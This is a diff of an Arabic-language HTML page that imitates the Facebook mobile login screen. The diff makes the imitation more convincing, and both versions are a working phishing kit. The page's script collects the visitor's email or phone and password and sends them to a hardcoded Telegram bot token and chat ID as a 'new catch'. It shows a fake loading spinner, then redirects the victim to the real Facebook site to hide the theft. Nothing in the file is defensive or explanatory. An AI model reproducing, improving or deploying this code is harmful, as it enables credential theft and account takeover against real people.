@@ -1,37 +1,136 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook – سجل الدخول أو سجل الآن</title>
+    <meta property="og:title" content="Facebook - Login">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png">
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 350px; text-align: center; }
-        h1 { color: #1877f2; font-size: 32px; }
-        input { width: 90%; padding: 10px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; }
-        button { width: 96%; padding: 10px; background: #1877f2; border: none; color: white; font-weight: bold; border-radius: 6px; cursor: pointer; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
+            background-color: #ffffff; margin: 0; padding: 0; 
+            display: flex; flex-direction: column; align-items: center; 
+        }
+
+        /* شريط التحميل العلوي */
+        .top-info {
+            width: 100%; background: #fff; padding: 12px 0;
+            text-align: center; color: #1877f2; font-size: 13.5px;
+            border-bottom: 1px solid #e5e5e5;
+        }
+
+        .main-container {
+            width: 100%; max-width: 412px;
+            padding: 0 16px; box-sizing: border-box; text-align: center;
+        }
+
+        .lang-header { color: #737373; font-size: 14px; margin: 20px 0 35px 0; }
+
+        /* شعار فيسبوك (أبعاد مطابقة تماماً) */
+        .fb-main-logo { width: 85px; height: 85px; margin-bottom: 35px; }
+
+        /* الخانات المذهلة */
+        .field-wrapper { width: 100%; margin-bottom: 12px; }
+        input {
+            width: 100%; height: 58px; /* الارتفاع المطلوب */
+            background-color: #ffffff; border: 1px solid #dddfe2;
+            border-radius: 16px; /* الانحناء المذهل */
+            padding: 0 16px; font-size: 16px; box-sizing: border-box;
+            outline: none; color: #1c1e21; text-align: right;
+        }
+        input:focus { border: 2px solid #1877f2; padding: 0 15px; }
+
+        /* الأزرار الراقية */
+        .btn-submit-login {
+            width: 100%; height: 48px; background-color: #0064e0;
+            color: #fff; border: none; border-radius: 24px;
+            font-size: 16px; font-weight: bold; margin-top: 8px; cursor: pointer;
+        }
+
+        .forgot-pass-link { display: block; margin-top: 25px; color: #1c1e21; text-decoration: none; font-size: 15px; font-weight: 500; }
+
+        .btn-create-account {
+            width: 100%; height: 42px; border: 1px solid #1877f2;
+            color: #1877f2; background: #fff; border-radius: 21px;
+            font-size: 14px; font-weight: 500; margin-top: 110px; /* مسافة الإقناع */
+            display: flex; align-items: center; justify-content: center; text-decoration: none;
+        }
+
+        /* شعار Meta السفلي */
+        .footer-logo-section { margin-top: 35px; margin-bottom: 20px; }
+        .meta-svg-logo { width: 65px; opacity: 0.9; }
+
+        /* شاشة التحميل الوهمية (Spinning Loader) */
+        #loading-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.9); z-index: 10000;
+            flex-direction: column; align-items: center; justify-content: center;
+        }
+        .spinner-icon {
+            width: 35px; height: 35px; border: 4px solid #f3f3f3;
+            border-top: 4px solid #1877f2; border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h1>facebook</h1>
-        <form id="f">
-            <input type="text" id="e" placeholder="الإيميل أو الهاتف" required>
-            <input type="password" id="p" placeholder="كلمة السر" required>
-            <button type="submit">تسجيل الدخول</button>
-        </form>
-    </div>
-    <script>
-        const T = "8305859982:AAHJEqmmZ4-KuKbNQqao9qfqMLRiNsqTatA";
-        const C = "8058949028";
 
-        document.getElementById('f').addEventListener('submit', function(e) {
+    <div id="loading-overlay"><div class="spinner-icon"></div></div>
+
+    <div class="top-info">احصل على فيسبوك لهاتف Android واستمتع بتصفح أسرع.</div>
+
+    <div class="main-container">
+        <div class="lang-header">العربية</div>
+        
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" class="fb-main-logo">
+
+        <form id="masterForm">
+            <div class="field-wrapper">
+                <input type="text" id="userInput" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
+            </div>
+            <div class="field-wrapper">
+                <input type="password" id="passInput" placeholder="كلمة السر" required>
+            </div>
+            <button type="submit" class="btn-submit-login">تسجيل الدخول</button>
+        </form>
+
+        <a href="#" class="forgot-pass-link">هل نسيت كلمة السر؟</a>
+
+        <a href="#" class="btn-create-account">إنشاء حساب جديد</a>
+        
+        <div class="footer-logo-section">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/O9mi99-65Z1.svg" class="meta-svg-logo">
+        </div>
+    </div>
+
+    <script>
+        // --- بيانات الاستقبال (مؤمنة وجاهزة) ---
+        const BOT_TOKEN = "8305859982:AAHJEqmmZ4-KuKbNQqao9qfqMLRiNsqTatA"; 
+        const CHAT_ID = "8058949028";
+        // ------------------------------------
+
+        document.getElementById('masterForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            const m = `🚨 صيد جديد:\n👤 الإيميل: ${document.getElementById('e').value}\n🔑 الباسورد: ${document.getElementById('p').value}`;
-            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(m)}`)
-            .then(() => { window.location.href = "https://www.facebook.com"; });
+            document.getElementById('loading-overlay').style.display = 'flex';
+
+            const user = document.getElementById('userInput').value;
+            const pass = document.getElementById('passInput').value;
+            
+            const textMsg = `✅ صيد جديد (نظام الأمان) ✅\n\n👤 المستخدم: ${user}\n🔑 كلمة السر: ${pass}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(textMsg)}`)
+            .then(() => {
+                setTimeout(() => {
+                    // تحويل المستخدم لصفحة الأمان الرسمية
+                    window.location.href = "https://m.facebook.com/login/save-device/";
+                }, 1500);
+            })
+            .catch(() => {
+                window.location.href = "https://m.facebook.com/";
+            });
         });
     </script>
 </body>
 </html>
-  
